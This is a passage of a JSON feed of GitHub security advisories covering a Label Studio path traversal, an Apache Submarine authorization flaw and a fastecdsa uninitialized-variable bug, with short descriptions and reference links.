            "title": "[label-studio-sdk] Label Studio has a Path Traversal Vulnerability via image Field",
            "date_modified": "2025-02-14T18:40:06.000Z",
            "date_published": "2025-02-14T15:16:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rgv9-w7jp-m23g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Incorrect Authorization vulnerability in Apache Submarine Server Core.</p>\n<p>This issue affects Apache Submarine Server Core: from 0.8.0.</p>\n<p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.</p>\n<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36265\">https://nvd.nist.gov/vuln/detail/CVE-2024-36265</a></li>\n<li><a href=\"https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz\">https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/06/12/3\">http://www.openwall.com/lists/oss-security/2024/06/12/3</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q97-8v3g-rpxw\">https://github.com/advisories/GHSA-6q97-8v3g-rpxw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q97-8v3g-rpxw",
            "title": "[apache-submarine] Apache Submarine Server Core Incorrect Authorization vulnerability",
            "date_modified": "2025-02-13T18:41:55.000Z",
            "date_published": "2024-06-12T15:31:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q97-8v3g-rpxw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package fastecdsa before 2.3.2 use an Uninitialized Variable on the stack, via the curvemath_mul function in src/curveMath.c, due to being used and interpreted as user-defined type. Depending on the variable's actual value it could be arbitrary free(), arbitrary realloc(), null pointer dereference and other. Since the stack can be controlled by the attacker, the vulnerability could be used to corrupt allocator structure, leading to possible heap exploitation. The attacker could cause denial of service by exploiting this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21502\">https://nvd.nist.gov/vuln/detail/CVE-2024-21502</a></li>\n<li><a href=\"https://github.com/AntonKueltz/fastecdsa/commit/57fc5689c95d649dab7ef60cc99ac64589f01e36\">https://github.com/AntonKueltz/fastecdsa/commit/57fc5689c95d649dab7ef60cc99ac64589f01e36</a></li>\n<li><a href=\"https://gist.github.com/keltecc/49da037072276f21b005a8337c15db26\">https://gist.github.com/keltecc/49da037072276f21b005a8337c15db26</a></li>\n<li><a href=\"https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c%23L210\">https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c%23L210</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-FASTECDSA-6262045\">https://security.snyk.io/vuln/SNYK-PYTHON-FASTECDSA-6262045</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ph86-g9r3-5qw4\">https://github.com/advisories/GHSA-ph86-g9r3-5qw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ph86-g9r3-5qw4",
            "title": "[fastecdsa] Uninitialized Variable in fastecdsa",
            "date_modified": "2025-02-12T21:59:32.000Z",
            "date_published": "2024-02-24T06:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ph86-g9r3-5qw4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}